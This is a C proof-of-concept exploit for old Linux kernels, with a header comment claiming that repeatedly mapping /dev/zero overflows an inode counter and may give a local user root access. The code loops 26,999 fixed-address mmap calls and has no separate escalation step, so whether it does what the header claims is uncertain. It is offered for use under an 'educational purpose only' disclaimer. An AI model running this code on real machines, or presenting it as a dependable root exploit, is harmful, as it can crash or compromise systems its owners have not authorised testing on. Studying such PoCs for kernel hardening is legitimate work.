/*  Linux Kernel 2.6.32-642 / 3.16.0-4 'inode' Integer Overflow PoC

  The inode is a data structure in a Unix-style file system which describes a filesystem
  object such as a file or a directory. Each inode stores the attributes and disk block
  locations of the object's data. Filesystem object attributes may include metadata, as
  well as owner and permission data.

  INODE can be overflowed by mapping a single file too many times, allowing for a local
  user to possibly gain root access.

  Disclaimer:
  This or previous program is for Educational purpose ONLY. Do not  use it without permission.
  The usual disclaimer applies, especially the fact that Todor Donev is not liable for any
  damages caused by direct or indirect use of the information or functionality provided
  by these programs. The author or any Internet provider bears NO responsibility for content
  or misuse of these programs or any derivatives thereof. By using these programs you accept
  the fac that any damage (dataloss, system crash, system compromise, etc.) caused by the use
  of these programs is not Todor Donev's responsibility.

  Thanks to Maya Hristova and all friends.

  Suggestions,comments and job offers are welcome!

  Copyright 2016 (c) Todor Donev
  Varna, Bulgaria
  todor.donev@gmail.com
  https://www.ethical-hacker.org/
  https://www.facebook.com/ethicalhackerorg
  http://pastebin.com/u/hackerscommunity

*/
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
void main(){
int fd, i;
fd = open("/dev/zero", O_RDONLY);
for(i = 0; i < 26999; i++){
mmap((char*)0x00000000 + (0x10000 * i), 1, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0);
}
}